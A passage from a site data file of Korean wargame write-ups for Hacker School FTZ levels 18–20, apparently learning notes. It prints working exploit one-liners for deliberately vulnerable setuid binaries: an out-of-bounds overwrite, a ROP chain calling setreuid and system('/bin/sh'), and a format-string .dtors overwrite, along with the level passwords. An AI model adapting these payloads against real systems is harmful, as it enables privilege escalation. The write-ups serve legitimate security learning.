있다.\r\n\r\n```\r\ncount = ebp - 0x70\r\nx = ebp - 0x6c\r\ncheck = ebp - 0x68\r\nstring = ebp - 0x64\r\n```\r\n\r\n```bash\r\n[level18@ftz level18]$ (python -c \"print('\\x08'*4+'\\xef\\xbe\\xad\\xde\\n')\";cat) | ./attackme \r\nEnter your command: my-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nOut Of Boundary (OOB)\r\n```","dir":"/hacker_school/ftz/","name":"level18.md","path":"hacker_school/ftz/level18.md","url":"/hacker_school/ftz/level18.html"},{"sort":19,"layout":"default","title":"Level 19","content":"# Level 19\r\n\r\n```note\r\nid : level19\r\n\r\npassword : swimming in pink\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\nmain()\r\n{ char buf[20];\r\n gets(buf);\r\n printf(\"%s\\n\",buf);\r\n}\r\n```\r\n\r\n간단한 bof문제이다. 하지만 setuid가 걸려있지 않기 때문에 단순히 쉘코드를 입력하면 쉘을 얻더라도 권한이 그대로인 쉘을 획득한다.<br>\r\n따라서 system을 통해 쉘을 실행하기 전에 `setreuid(level20's uid)`를 해줘야한다.<br><br>\r\n먼저 main함수의 return address를 조지기 위해 buf의 위치를 파악한 후 padding길이를 구한다.\r\n\r\n<pre>\r\n(gdb) disas main\r\nDump of assembler code for function main:\r\n0x08048440 (main+0):\tpush   %ebp\r\n0x08048441 (main+1):\tmov    %esp,%ebp\r\n0x08048443 (main+3):\tsub    $0x28,%esp\r\n0x08048446 (main+6):\tsub    $0xc,%esp\r\n\r\n<b>0x08048449 (main+9):\tlea    0xffffffd8(%ebp),%eax\r\n0x0804844c (main+12):\tpush   %eax\r\n0x0804844d (main+13):\tcall   0x80482f4 (gets) </b>\r\n\r\n0x08048452 (main+18):\tadd    $0x10,%esp\r\n0x08048455 (main+21):\tsub    $0x8,%esp\r\n0x08048458 (main+24):\tlea    0xffffffd8(%ebp),%eax\r\n0x0804845b (main+27):\tpush   %eax\r\n0x0804845c (main+28):\tpush   $0x80484d8\r\n0x08048461 (main+33):\tcall   0x8048324 (printf)\r\n0x08048466 (main+38):\tadd    $0x10,%esp\r\n0x08048469 (main+41):\tleave  \r\n0x0804846a (main+42):\tret\r\n</pre>  \r\n\r\nid 명령어를 이용해 level20의 uid 값을 구한 후, objdump를 통해 setreuid, system 함수, \"/bin/sh\"의 위치를 알아낸다.<br>\r\nlevel11에서 system함수, \"/bin/sh\"의 위치를 알아낼 때처럼 똑같이 하면 된다.\r\n\r\n```bash\r\n[level19@ftz tmp]$ id level20\r\nuid=3100(level20) gid=3100(level20) groups=3100(level20)\r\n[level19@ftz tmp]$ ldd ../attackme \r\n\tlibc.so.6 => /lib/tls/libc.so.6 (0x42000000)\r\n\t/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)\r\n[level19@ftz tmp]$ objdump -d /lib/tls/libc.so.6\r\n\r\n... (중략) ...\r\n\r\n420d7920 <setreuid>:\r\n420d7920: 55 push %ebp\r\n420d7921: 89 e5 mov %esp,%ebp\r\n420d7923: 53 push %ebx\r\n420d7924: 8b 55 08 mov 0x8(%ebp),%edx\r\n420d7927: e8 91 da f3 ff call 420153bd <__i686.get_pc_thunk.bx>\r\n\r\n... (후략) ...\r\n```\r\n\r\n우선 아래와 같이 먼저 setreuid를 호출하도록 했다. 그러나 setreuid를 호출한 후에 system함수를 호출하기 위해서는 setreuid함수가 끝난 후 esp값을 조율해주어야한다.<br>\r\nesp가 system을 가리키도록 하기 위해서 pop pop ret 가젯을 찾아서 setreuid의 return address에 넣어준다. 이런식으로 ret으로 끝나는 가젯을 찾아서 실행시키는 것을 Return Oriented Programming (ROP)라고 한다.\r\n\r\n<img src=\"/picture/hacker_school/ftz/level19_1.png\" width=\"1000\"/>\r\n<img src=\"/picture/hacker_school/ftz/level19_2.png\" width=\"700\"/>\r\n\r\n\r\n```asm\r\n42015635: 5b pop %ebx\r\n42015636: 5d pop %ebp\r\n42015637: c3 ret\r\n```\r\n\r\n아래와 같이 payload를 구성하면 쉘을 딸 수 있다.\r\n\r\n```bash\r\n# 0x2c byte padding + setreuid + ret addr (pop pop ret gadget) + 3100 (level20's uid) + 3100 + system + 4 byte padding + addr of \"/bin/sh\"\r\n[level19@ftz level19]$ (python -c \"print('A'*0x2c+'\\x20\\x79\\x0d\\x42\\x35\\x56\\x01\\x42\\x1c\\x0c\\x00\\x00\\x1c\\x0c\\x00\\x00\\xc0\\xf2\\x03\\x42\\x41\\x41\\x41\\x41\\xa4\\x7e\\x12\\x42\\n')\";cat) | ./attackme \r\nB5V\u0001B\u001cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA y\r\n\r\nmy-pass\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nbuffer overflow, Return Oriented Programming (ROP)\r\n```","dir":"/hacker_school/ftz/","name":"level19.md","path":"hacker_school/ftz/level19.md","url":"/hacker_school/ftz/level19.html"},{"sort":20,"layout":"default","title":"Level 20","content":"# Level 20\r\n\r\n```note\r\nid : level20\r\n\r\npassword : we are just regular guys\r\n```\r\n\r\nhint를 보면 attackme의 소스코드가 나온다.<br>\r\nattackme에 setuid가 걸려있으니 얘를 조져보자.\r\n\r\n```c\r\n#include <stdio.h>\r\nmain(int argc,char **argv)\r\n{ char bleh[80];\r\n setreuid(3101,3101);\r\n fgets(bleh,79,stdin);\r\n printf(bleh);\r\n}\r\n```\r\n\r\n사용자의 input을 그대로 printf에 때려 박는다. 여기에서 format string bug (FSB)가 발생한다.<br>\r\nprintf의 포맷중에서는 화면에 출력하는 것 뿐만아니라 메모리에 입력하는 포맷도 존재하기 때문에 이를 이용하여 임의의 공간에 임의의 값을 쓰는 것이 가능해진다.\r\n\r\n## Format String Bug\r\n\r\nprintf에는 무려 지금까지 출력한 byte수를 저장할 수 있도록 %n(4byte값으로 저장), %hn(2byte), %hhn(1byte) 포맷이 존재한다.<br>\r\n따라서 %n과 같은 서식문자가 저장할 공간의 메모리 주소를 미리 알아내어 준비한 뒤 원하는 값을 해당 메모리 주소에 넣기 위해서 원하는 값만큼 %n 이전에 출력하면 된다.<br><br>\r\n저장할 공간의 메모리 주소를 미리 알아내어 다른 부분은 훼손하지 않고 해당 부분만 변형할 수 있기 때문에 bof보다 더 영향력이 크면 컸지 작진 않다.<br>\r\n문제는 메모리 주소를 사전에 알아야 한다는 것인데, 해커스쿨 플랫폼 같은 경우에는 stack에 ASLR이 걸려있기 때문에 입력 buffer와의 간격을 계산하여 return address를 조졌던 bof와 달리, fsb로는 return address를 조지기는 어려워 보인다. 따라서 저장위치가 바뀌지 않으면서도 프로그램의 흐름을 바꿀 수 있는 부분을 이용해야한다.\r\n\r\n### Constructor, Destructor\r\n\r\nC++에만 존재할 것 같았던 constructor와 destructor는 C에도 존재한다. 물론 object를 생성하고 소멸시키는데 사용되는 C++의 constructor, destructor와는 다르게 C에는 main함수가 호출되기 이전에 호출되는 constructor, main함수가 종료된 후에 호출되는 destructor가 존재한다. constructor와 destructor는 아래와 같이 만들 수 있다.\r\n\r\n```C\r\n#include <stdio.h>\r\n\r\n/*\r\n * constructor : __attribute__((constructor (priority)))\r\n * destructor : __attribute__((destructor (priority)))\r\n *\r\n * priority값은 생략 가능.\r\n */\r\n\r\n__attribute__((constructor (101))) void constructor_1(void)\r\n{\r\n puts(\"constructor_1\");\r\n}\r\n\r\n__attribute__((constructor (102))) void constructor_2(void)\r\n{\r\n puts(\"constructor_2\");\r\n}\r\n\r\n__attribute__((constructor (103))) void constructor_3(void)\r\n{\r\n puts(\"constructor_3\");\r\n}\r\n\r\n__attribute__((destructor (101))) void destructor_1(void)\r\n{\r\n puts(\"destructor_1\");\r\n}\r\n\r\n__attribute__((destructor (102))) void destructor_2(void)\r\n{\r\n puts(\"destructor_2\");\r\n}\r\n\r\n__attribute__((destructor (103))) void destructor_3(void)\r\n{\r\n puts(\"destructor_3\");\r\n}\r\n\r\nint main(int argc, char** argv)\r\n{\r\n puts(\"main\");\r\n return 0;\r\n}\r\n```\r\n\r\n위와 같이 직접 constructor와 destructor를 정의할 수 있다.<br>\r\nconstructor는 priority값이 낮은 것 먼저, destructor는 priority값이 높은 것 먼저 실행된다.<br>\r\npriority값은 0~100사이는 reserved되어있기 때문에 101부터 사용해야한다.\r\n\r\n```bash\r\n$ ./test\r\nconstructor_1\r\nconstructor_2\r\nconstructor_3\r\nmain\r\ndestructor_3\r\ndestructor_2\r\ndestructor_1\r\n```\r\n\r\n```note\r\nhacker school에서 사용하는 gcc 버전은 3.2.2로 매우 옛날 것이기 때문에 constructor, destructor를 만들 때 priority를 줄 수 없다.\r\n\r\n여러개의 constructor와 destructor를 만들었을 경우, **constructor**는 **LIFO**, **destructor**는 **FIFO**로 처리된다.\r\n\r\n따라서 위 코드에서 priority값만 빼고 hacker school 플랫폼에서 다시 빌드하면 **constructor 3, 2, 1, main, destructor 3, 2, 1**순으로 실행된다.\r\n```\r\n\r\n```bash\r\n[level20@ftz tmp]$ gcc -v\r\nReading specs from /usr/lib/gcc-lib/i386-redhat-linux/3.2.2/specs\r\nConfigured with: ../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --enable-shared --enable-threads=posix --disable-checking --with-system-zlib --enable-__cxa_atexit --host=i386-redhat-linux\r\nThread model: posix\r\ngcc version 3.2.2 20030222 (Red Hat Linux 3.2.2-5)\r\n```\r\n\r\n\r\n왜 갑자기 constructor, destructor 얘기를 꺼내느냐, destructor는 main함수가 끝난 후에 실행이 되기 때문에 main함수에서 FSB를 이용하여 destructor함수를 가리키는 포인터 값을 조작하여 destructor 처리 루틴에서 프로그램의 흐름을 변조시킬 수 있기 때문이다.<br>\r\nconstructor, destructor함수들의 함수 포인터들은 .ctor, .dtor section에서 관리가 되며, 해당 section들의 위치는 `readelf`명령어를 통해 확인 가능하다.\r\n\r\n<pre>\r\n[level20@ftz tmp]$ readelf -S test\r\nThere are 34 section headers, starting at offset 0x1e04:\r\n\r\nSection Headers:\r\n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\r\n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0\r\n  [ 1] .interp           PROGBITS        080480f4 0000f4 000013 00   A  0   0  1\r\n  [ 2] .note.ABI-tag     NOTE            08048108 000108 000020 00   A  0   0  4\r\n  [ 3] .hash             HASH            08048128 000128 000028 04   A  4   0  4\r\n  [ 4] .dynsym           DYNSYM          08048150 000150 000050 10   A  5   1  4\r\n  [ 5] .dynstr           STRTAB          080481a0 0001a0 00004a 00   A  0   0  1\r\n  [ 6] .gnu.version      VERSYM          080481ea 0001ea 00000a 02   A  4   0  2\r\n  [ 7] .gnu.version_r    VERNEED         080481f4 0001f4 000020 00   A  5   1  4\r\n  [ 8] .rel.dyn          REL             08048214 000214 000008 08   A  4   0  4\r\n  [ 9] .rel.plt          REL             0804821c 00021c 000010 08   A  4   b  4\r\n  [10] .init             PROGBITS        0804822c 00022c 000017 00  AX  0   0  4\r\n  [11] .plt              PROGBITS        08048244 000244 000030 04  AX  0   0  4\r\n  [12] .text             PROGBITS        08048274 000274 0001f0 00  AX  0   0  4\r\n  [13] .fini             PROGBITS        08048464 000464 00001b 00  AX  0   0  4\r\n  [14] .rodata           PROGBITS        08048480 000480 00005e 00   A  0   0  4\r\n  [15] .eh_frame         PROGBITS        080484e0 0004e0 000004 00   A  0   0  4\r\n  [16] .data             PROGBITS        080494e4 0004e4 00000c 00  WA  0   0  4\r\n  [17] .dynamic          DYNAMIC         080494f0 0004f0 0000c8 08  WA  5   0  4\r\n  <b>[18] .ctors            PROGBITS        080495b8 0005b8 000014 00  WA  0   0  4\r\n  [19] .dtors            PROGBITS        080495cc 0005cc 000014 00  WA  0   0  4 </b>\r\n  [20] .jcr              PROGBITS        080495e0 0005e0 000004 00  WA  0   0  4\r\n  [21] .got              PROGBITS        080495e4 0005e4 000018 04  WA  0   0  4\r\n  [22] .bss              NOBITS          080495fc 0005fc 000004 00  WA  0   0  4\r\n  [23] .comment          PROGBITS        00000000 0005fc 000132 00      0   0  1\r\n  [24] .debug_aranges    PROGBITS        00000000 000730 000078 00      0   0  8\r\n  [25] .debug_pubnames   PROGBITS        00000000 0007a8 000025 00      0   0  1\r\n  [26] .debug_info       PROGBITS        00000000 0007cd 000a84 00      0   0  1\r\n  [27] .debug_abbrev     PROGBITS        00000000 001251 000138 00      0   0  1\r\n  [28] .debug_line       PROGBITS        00000000 001389 00027c 00      0   0  1\r\n  [29] .debug_frame      PROGBITS        00000000 001608 000014 00      0   0  4\r\n  [30] .debug_str        PROGBITS        00000000 00161c 0006ba 01  MS  0   0  1\r\n  [31] .shstrtab         STRTAB          00000000 001cd6 00012b 00      0   0  1\r\n  [32] .symtab           SYMTAB          00000000 002354 000720 10     33  54  4\r\n  [33] .strtab           STRTAB          00000000 002a74 000440 00      0   0  1\r\nKey to Flags:\r\n  W (write), A (alloc), X (execute), M (merge), S (strings)\r\n  I (info), L (link order), G (group), x (unknown)\r\n  O (extra OS processing required) o (OS specific), p (processor specific)\r\n</pre>  \r\n\r\n그리고 hexdump를 통해 hex값으로 test를 dump한 후, .ctors부분과 .dtors부분을 확인했다. 위에 readelf를 통해 알 수 있듯이 둘은 붙어있었다.\r\n\r\n<pre>\r\n[level20@ftz tmp]$ hexdump test\r\n\r\n... (중략) ...\r\n\r\n# 5b8부터 5cc전까지 .ctor, 5cc부터는 .dtor\r\n00005b0 0000 0000 0000 0000 <b>ffff ffff 8324 0804\r\n00005c0 833c 0804 8354 0804 0000 0000 ffff ffff\r\n00005d0 836c 0804 8384 0804 839c 0804 0000 0000 </b>\r\n\r\n... (후략) ...\r\n</pre>  \r\n\r\n그리고 constructor와 destructor를 호출하는 루틴은 각각 `__do_global_ctors_aux`와 `__do_global_dtors_aux`이다.<br>\r\nctor, dtor부분에 watchpoint를 건 후에 프로그램을 동작시키면 어느 함수에서 ctor, dtor영역을 접근하는지 쉽게 파악할 수 있다.\r\n\r\n```gdb\r\n(gdb) disas __do_global_ctors_aux\r\nDump of assembler code for function __do_global_ctors_aux:\r\n0x08048440 <__do_global_ctors_aux+0>:\tpush %ebp\r\n0x08048441 <__do_global_ctors_aux+1>:\tmov %esp,%ebp\r\n0x08048443 <__do_global_ctors_aux+3>:\tpush %ebx\r\n0x08048444 <__do_global_ctors_aux+4>:\tpush %edx\r\n0x08048445 <__do_global_ctors_aux+5>:\tmov 0x80495c4,%eax <-- constructor 함수 중 마지막 함수의 포인터가 위치하는 곳\r\n0x0804844a <__do_global_ctors_aux+10>:\tcmp $0xffffffff,%eax <-- 값이 0xffffffff인지 확인\r\n0x0804844d <__do_global_ctors_aux+13>:\tmov $0x80495c4,%ebx\r\n0x08048452 <__do_global_ctors_aux+18>:\tje 0x8048460 <__do_global_ctors_aux+32>\r\n0x08048454 <__do_global_ctors_aux+20>:\tsub $0x4,%ebx <-- constructor 함수 포인터 4 감소\r\n0x08048457 <__do_global_ctors_aux+23>:\tcall *%eax <-- constructor 함수 호출\r\n0x08048459 <__do_global_ctors_aux+25>:\tmov (%ebx),%eax\r\n0x0804845b <__do_global_ctors_aux+27>:\tcmp $0xffffffff,%eax\r\n0x0804845e <__do_global_ctors_aux+30>:\tjne 0x8048454 <__do_global_ctors_aux+20>\r\n0x08048460 <__do_global_ctors_aux+32>:\tpop %eax\r\n0x08048461 <__do_global_ctors_aux+33>:\tpop %ebx\r\n0x08048462 <__do_global_ctors_aux+34>:\tleave \r\n0x08048463 <__do_global_ctors_aux+35>:\tret \r\nEnd of assembler dump.\r\n\r\n(gdb) disas __do_global_dtors_aux\r\nDump of assembler code for function __do_global_dtors_aux:\r\n0x080482bc <__do_global_dtors_aux+0>:\tpush %ebp\r\n0x080482bd <__do_global_dtors_aux+1>:\tmov %esp,%ebp\r\n0x080482bf <__do_global_dtors_aux+3>:\tsub $0x8,%esp\r\n0x080482c2 <__do_global_dtors_aux+6>:\tcmpb $0x0,0x80495fc\r\n0x080482c9 <__do_global_dtors_aux+13>:\tjne 0x80482f4 <__do_global_dtors_aux+56>\r\n0x080482cb <__do_global_dtors_aux+15>:\tmov 0x80494ec,%eax <-- 첫번째 destructor함수 포인터가 위치하는 곳의 주소값을 가지고 있음.\r\n0x080482d0 <__do_global_dtors_aux+20>:\tmov (%eax),%edx\r\n0x080482d2 <__do_global_dtors_aux+22>:\ttest %edx,%edx <-- 0인지 확인\r\n0x080482d4 <__do_global_dtors_aux+24>:\tje 0x80482ed <__do_global_dtors_aux+49>\r\n0x080482d6 <__do_global_dtors_aux+26>:\tmov %esi,%esi\r\n0x080482d8 <__do_global_dtors_aux+28>:\tadd $0x4,%eax\r\n0x080482db <__do_global_dtors_aux+31>:\tmov %eax,0x80494ec <-- 다음 destructor함수 포인터가 위치하는 곳으로 주소값 옮기고 저장.\r\n0x080482e0 <__do_global_dtors_aux+36>:\tcall *%edx <-- destructor 함수 호출\r\n0x080482e2 <__do_global_dtors_aux+38>:\tmov 0x80494ec,%eax\r\n0x080482e7 <__do_global_dtors_aux+43>:\tmov (%eax),%edx\r\n0x080482e9 <__do_global_dtors_aux+45>:\ttest %edx,%edx\r\n0x080482eb <__do_global_dtors_aux+47>:\tjne 0x80482d8 <__do_global_dtors_aux+28>\r\n0x080482ed <__do_global_dtors_aux+49>:\tmovb $0x1,0x80495fc\r\n0x080482f4 <__do_global_dtors_aux+56>:\tleave \r\n0x080482f5 <__do_global_dtors_aux+57>:\tret \r\n0x080482f6 <__do_global_dtors_aux+58>:\tmov %esi,%esi\r\nEnd of assembler dump.\r\n```\r\n\r\n최종적으로 정리하면 아래 그림처럼 되겠다.\r\n\r\n<img src=\"/picture/hacker_school/ftz/level20.png\" width=\"1000\"/>\r\n\r\n참고로 .ctor .dtor사용하던 시절은 지났고 지금은(gcc 4.7 이후부터는) .ctors .dtors대신에 .init_array .fini_array를 사용한다고 한다.\r\n\r\n### attackme\r\n\r\n.dtors의 주소값이 0x8049594이다. hackerschool 플랫폼은 stack에만 ASLR이 걸려있기 때문에 나머지는 고정적인 주소값을 가지게 된다.<br>\r\n따라서 0x8049598주소부터 4byte를 쉘코드의 주소로 조지면 된다.<br>\r\n쉘코드는 level17 때처럼 환경변수에 넣어놓고 사용했다.\r\n\r\n<pre>\r\n[level20@ftz level20]$ readelf -S attackme\r\nThere are 34 section headers, starting at offset 0x1dcc:\r\n\r\nSection Headers:\r\n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\r\n\r\n  ... (중략) ...\r\n\r\n  [19] .dtors            PROGBITS        08049594 000594 000008 00  WA  0   0  4\r\n\r\n  ... (중략) ...\r\n\r\nKey to Flags:\r\n  W (write), A (alloc), X (execute), M (merge), S (strings)\r\n  I (info), L (link order), G (group), x (unknown)\r\n  O (extra OS processing required) o (OS specific), p (processor specific)\r\n</pre>  \r\n\r\n우선 아래와 같이 입력값이 어디에 위치하게 되는지 알아보았다.\r\n\r\n```bash\r\n[level20@ftz tmp]$ ../attackme\r\nAAAABBBB %x %x %x %x %x\r\nAAAABBBB 4f 4212ecc0 4207a750 41414141 42424242\r\n```\r\n\r\n세번째 %x부터 입력값이 나오는 것을 확인할 수 있었다. 따라서 아래와 같이 구성한다면 .dtors section에 shellcode의 주소값을 넣을 수 있다.\r\n\r\n```\r\ntarget address 상위 2byte 4byte padding target address 하위 2byte\r\n\\x9a\\x95\\x04\\x08 AAAA \\x98\\x95\\x04\\x08\r\n\r\n0xbfff값을 입력하기 위해 0xbfffbyte(12+8+8+49123) 출력 target address 상위 2byte에 입력\r\n%8x%8x%49123x %hn\r\n\r\n0xff03값을 입력하기 위해 마저 16132byte 출력(0xbfff+16132=0xff03) target address 하위 2byte에 입력\r\n%16132x %hn\r\n```\r\n\r\n쉘코드의 주소값인 0xbfffff03이 4byte로 하면 음수가 되기 때문에 혹시 몰라서 2byte씩 나누어서 입력했다.\r\n\r\n\r\n```bash\r\n[level20@ftz tmp]$ ./shellcode\r\n0xbfffff03\r\n[level20@ftz tmp]$ (python -c \"print('\\x9a\\x95\\x04\\x08AAAA\\x98\\x95\\x04\\x08%8x%8x%49123x%hn%16132x%hn')\";cat) | ../attackme\r\n\r\n... (쓰레기 출력값) ...\r\n\r\nmy-pass\r\n\r\nTERM environment variable not set.\r\n\r\nclear Password is \"i will come in a minute\".\r\n웹에서 등록하세요.\r\n\r\n* 해커스쿨의 든 레벨을 통과하신 것을 축하드립니다.\r\n당신의 끈질긴 열정과 능숙한 솜씨에 찬사를 보냅니다.\r\n해커스쿨에서는 실력있 분들을 모아 연구소라는 그룹을 운영하고 있습니다.\r\n이 메시지를 보시는 분들 중에 연구소에 관심있으신 분은 자유로운 양식의\r\n가입 신청서를 admin@hackerschool.org로 보내주시기 바랍니다.\r\n```\r\n\r\n```tip\r\n## 알게 된 점\r\n\r\nconstructor, destructor\r\n\r\nFormat String Bug (FSB)\r\n```","dir":"/hacker_school/ftz/","name":"level20.md","path":"hacker_school/ftz/level20.md","url":"/hacker_school/ftz/level20.html"}]